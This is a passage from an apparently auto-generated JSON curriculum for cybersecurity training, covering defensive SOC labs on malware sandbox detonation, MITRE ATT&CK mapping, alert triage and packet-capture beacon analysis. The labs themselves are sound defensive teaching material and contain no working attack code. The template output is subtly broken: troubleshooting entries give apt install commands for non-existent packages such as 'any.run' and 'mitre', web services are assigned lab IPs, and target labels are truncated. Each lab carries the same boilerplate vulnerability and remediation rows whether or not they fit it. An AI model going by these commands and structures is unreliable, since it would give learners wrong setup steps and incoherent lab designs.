        "label": "Primary discovery scan or execution using MXToolbox"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y mxtoolbox."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 40,
    "week": 20,
    "classNumber": 40,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 20: Phishing Triage & Email Analysis",
    "title": "Malicious Attachment & URL Detonation",
    "category": "Malware Detonation",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Analyze phishing links and document payloads inside an isolated environment.",
    "tools": [
      "Any.Run",
      "Hybrid Analysis",
      "CyberChef"
    ],
    "targetEnvironment": "Web-based sandboxes",
    "topology": {
      "description": "Lab topology for Malicious Attachment & URL Detonation",
      "nodes": [
        {
          "id": "source",
          "label": "Any.Run",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Web-based",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Malware Detonation",
        "explanation": "Analyze phishing links and document payloads inside an isolated environment."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Malicious Attachment & URL Detonation",
        "description": "Verify system connectivity and tool installation in Web-based sandboxes.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# In CyberChef:\n# Recipe 1: From Base64\n# Recipe 2: XOR (Key: 0x42)\n# Recipe 3: Gunzip\n# Decode payload extracted from phishing document VBA macro\n# Submit sample SHA256 to sandbox detonation engine",
            "description": "Standard lab command sequence",
            "output": "Sandbox reports high threat score; C2 callback domain and dropped executable hash isolated."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Malicious Attachment & URL Detonation",
        "description": "Open an online, interactive malware detonation sandbox session (such as Any.Run). Upload a suspicious document payload to monitor its runtime behavior, and extract its callback command domains. Use CyberChef to decode obfuscated base64 terminal commands extracted from the mail body.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# In CyberChef:\n# Recipe 1: From Base64\n# Recipe 2: XOR (Key: 0x42)\n# Recipe 3: Gunzip\n# Decode payload extracted from phishing document VBA macro\n# Submit sample SHA256 to sandbox detonation engine",
            "description": "Standard lab command sequence",
            "output": "Sandbox reports high threat score; C2 callback domain and dropped executable hash isolated."
          }
        ],
        "verification": "Sandbox reports high threat score; C2 callback domain and dropped executable hash isolated.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Web-based sandboxes",
          "Any.Run",
          "Sandbox reports high threat score; C2 ca...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why do modern malware authors use multi-layered obfuscation and Base64 in macro payloads?",
        "hint": "To bypass static signature inspection engines and antivirus perimeter gateways."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Malicious Attachment & URL Detonation?",
      "options": [
        "Analyze phishing links and document payloads inside an isolated environment.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Analyze phishing links and document payloads inside an isolated environment."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 40.",
    "eli5Story": {
      "title": "The Bomb Squad Blast Box (Malware Detonation Sandbox)",
      "analogy": "When you find a mysterious suspicious package, you don't open it on your desk! You put it inside a bomb-proof glass box (Any.Run) and watch what it does!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 40",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Any.Run",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Web-based sandboxes"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Any.Run"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y any.run."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 41,
    "week": 21,
    "classNumber": 41,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 21: Frameworks & Alert Triaging",
    "title": "Mapping Tactics to the MITRE ATT&CK Framework",
    "category": "Threat Intelligence",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Contextualize multi-stage security events using standard defense industry matrices.",
    "tools": [
      "MITRE ATT&CK Navigator",
      "SIEM alerts"
    ],
    "targetEnvironment": "Documentation workstation",
    "topology": {
      "description": "Lab topology for Mapping Tactics to the MITRE ATT&CK Framework",
      "nodes": [
        {
          "id": "source",
          "label": "MITRE ATT&CK Navigator",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Documentation",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Threat Intelligence",
        "explanation": "Contextualize multi-stage security events using standard defense industry matrices."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Mapping Tactics to the MITRE ATT&CK Framework",
        "description": "Verify system connectivity and tool installation in Documentation workstation.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Map incident steps to ATT&CK:\n# 1. theHarvester -> TA0043 (Reconnaissance) -> T1589\n# 2. Responder -> TA0006 (Credential Access) -> T1557.001\n# 3. Chisel Pivot -> TA0008 (Lateral Movement) -> T1572\n# Export JSON layer for ATT&CK Navigator",
            "description": "Standard lab command sequence",
            "output": "Completed ATT&CK heatmap layer visualizing entire attack lifecycle across Tactics & Techniques."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Mapping Tactics to the MITRE ATT&CK Framework",
        "description": "Collect three distinct multi-stage security logs generated from previous labs. Extract the process names and behaviors, mapping each step to its corresponding MITRE ATT&CK identifier (e.g., T1059 for command execution, T1078 for valid account abuse) using the official ATT&CK Navigator tool.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Map incident steps to ATT&CK:\n# 1. theHarvester -> TA0043 (Reconnaissance) -> T1589\n# 2. Responder -> TA0006 (Credential Access) -> T1557.001\n# 3. Chisel Pivot -> TA0008 (Lateral Movement) -> T1572\n# Export JSON layer for ATT&CK Navigator",
            "description": "Standard lab command sequence",
            "output": "Completed ATT&CK heatmap layer visualizing entire attack lifecycle across Tactics & Techniques."
          }
        ],
        "verification": "Completed ATT&CK heatmap layer visualizing entire attack lifecycle across Tactics & Techniques.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Documentation workstation",
          "MITRE ATT&CK Navigator",
          "Completed ATT&CK heatmap layer visualizi...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How does standardizing telemetry against MITRE ATT&CK assist executive risk communication?",
        "hint": "It translates technical log events into an industry-standard matrix of adversary capabilities."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Mapping Tactics to the MITRE ATT&CK Framework?",
      "options": [
        "Contextualize multi-stage security events using standard defense industry matrices.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Contextualize multi-stage security events using standard defense industry matrices."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 41.",
    "eli5Story": {
      "title": "The Detective's Clue Board Matrix (MITRE ATT&CK)",
      "analogy": "A big poster on the wall listing every trick a burglar might try, from picking locks to hiding in the closet, so we know what they will do next!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 41",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with MITRE ATT&CK Navigator",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Documentation workstation"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using MITRE ATT&CK Navigator"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y mitre."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 42,
    "week": 21,
    "classNumber": 42,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 21: Frameworks & Alert Triaging",
    "title": "Triaging a SOC Alert Queue",
    "category": "SOC Operations",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Manage an active dashboard and separate true security incidents from false positives.",
    "tools": [
      "OpenCTI",
      "Simulated SOC ticketing dashboard"
    ],
    "targetEnvironment": "Lab SIEM panel",
    "topology": {
      "description": "Lab topology for Triaging a SOC Alert Queue",
      "nodes": [
        {
          "id": "source",
          "label": "OpenCTI",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Lab",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "SOC Operations",
        "explanation": "Manage an active dashboard and separate true security incidents from false positives."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Triaging a SOC Alert Queue",
        "description": "Verify system connectivity and tool installation in Lab SIEM panel.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Evaluate queue of 10 incoming security alerts:\n# 1. Investigate user account history\n# 2. Correlate IP geographic reputation\n# 3. Check VirusTotal for binary hash\n# Tag alerts as TP (True Positive) or FP (False Positive)\n# Create P1 ticket for verified credential theft incident",
            "description": "Standard lab command sequence",
            "output": "10 alerts triaged: 7 False Positives closed, 3 True Positives escalated with full context."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Triaging a SOC Alert Queue",
        "description": "Access a mock SOC alerting console loaded with 10 concurrent events. Run searches against user histories, internal network configurations, and file hashes to categorize each event as either a True Positive or False Positive. Draft a formal escalation ticket for the highest priority threat.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "# Evaluate queue of 10 incoming security alerts:\n# 1. Investigate user account history\n# 2. Correlate IP geographic reputation\n# 3. Check VirusTotal for binary hash\n# Tag alerts as TP (True Positive) or FP (False Positive)\n# Create P1 ticket for verified credential theft incident",
            "description": "Standard lab command sequence",
            "output": "10 alerts triaged: 7 False Positives closed, 3 True Positives escalated with full context."
          }
        ],
        "verification": "10 alerts triaged: 7 False Positives closed, 3 True Positives escalated with full context.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Lab SIEM panel",
          "OpenCTI",
          "10 alerts triaged: 7 False Positives clo...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the operational danger of unresolved high False Positive rates in a SOC?",
        "hint": "Alert fatigue causes analysts to overlook or deprioritize real adversary intrusions."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Triaging a SOC Alert Queue?",
      "options": [
        "Manage an active dashboard and separate true security incidents from false positives.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Manage an active dashboard and separate true security incidents from false positives."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 42.",
    "eli5Story": {
      "title": "Separating False Alarms from Real Campfires (SOC Alert Triaging)",
      "analogy": "Sometimes toast burns and sets off the smoke alarm (False Positive). Sometimes there is real fire (True Positive). A SOC analyst knows how to tell the difference fast!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 42",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with OpenCTI",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Lab SIEM panel"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using OpenCTI"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y opencti."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 43,
    "week": 22,
    "classNumber": 43,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 22: Network Security Monitoring (NSM)",
    "title": "Analyzing Full Packet Captures for Malware Patterns",
    "category": "Network Forensics",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Parse packet captures to identify command-and-control (C2) callback patterns.",
    "tools": [
      "Wireshark",
      "Network Miner",
      "C2 Beacons"
    ],
    "targetEnvironment": "Analyst workstation",
    "topology": {
      "description": "Lab topology for Analyzing Full Packet Captures for Malware Patterns",
      "nodes": [
        {
          "id": "source",
          "label": "Wireshark",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Analyst",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Network Forensics",
        "explanation": "Parse packet captures to identify command-and-control (C2) callback patterns."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Analyzing Full Packet Captures for Malware Patterns",
        "description": "Verify system connectivity and tool installation in Analyst workstation.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "tshark -r malware_beacon.pcap -Y 'http' -T fields -e frame.time_epoch -e ip.dst -e http.request.uri",
            "description": "Execute tshark command",
            "output": "[+] Command executed successfully.\nOutput: Malicious executable extracted from PCAP; regular 30-second beacon jitter identified."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Analyzing Full Packet Captures for Malware Patterns",
        "description": "Load a multi-gigabyte malware PCAP traffic record into Network Miner to automatically split out embedded files and images. Open the trace file in Wireshark, analyze TCP conversation streams, and identify the beacon pacing used by compromised systems to communicate with external servers.",
        "commands": [
          {
            "shell": "bash",
            "cmd": "tshark -r malware_beacon.pcap -Y 'http' -T fields -e frame.time_epoch -e ip.dst -e http.request.uri",
            "description": "Execute tshark command",
            "output": "[+] Command executed successfully.\nOutput: Malicious executable extracted from PCAP; regular 30-second beacon jitter identified."
          }
        ],
        "verification": "Malicious executable extracted from PCAP; regular 30-second beacon jitter identified.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Analyst workstation",
          "Wireshark",
          "Malicious executable extracted from PCAP...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why do advanced C2 frameworks introduce 'jitter' (random timing variance) into beacon intervals?",
        "hint": "To evade automated frequency analysis algorithms that look for fixed-interval connections."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Analyzing Full Packet Captures for Malware Patterns?",
      "options": [
        "Parse packet captures to identify command-and-control (C2) callback patterns.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Parse packet captures to identify command-and-control (C2) callback patterns."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 43.",
    "eli5Story": {
      "title": "Listening to the Secret Spy Morse Code Radio (PCAP Malware Patterns)",
      "analogy": "A sneaky spy program sends a tiny beep every 30 seconds back to the villain. We listen to the network waves and measure the rhythm of the beeps!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 43",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Wireshark",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Analyst workstation"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Wireshark"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y wireshark."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 44,
    "week": 22,
    "classNumber": 44,
    "phase": 3,
    "phaseTitle": "Phase 3: SOC Operations & Incident Response",
    "weekTitle": "Week 22: Network Security Monitoring (NSM)",
    "title": "Network Intrusion Detection with Suricata",
    "category": "NIDS / Snort",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Write signature matching engines to inspect and alert on suspicious network traffic trends.",
    "tools": [
      "Suricata",
      "Kali Linux",
      "YAML"
    ],
    "targetEnvironment": "Ubuntu/Suricata Gateway VM",
    "topology": {
      "description": "Lab topology for Network Intrusion Detection with Suricata",
      "nodes": [
        {
          "id": "source",
          "label": "Suricata",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Ubuntu/Suricata",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
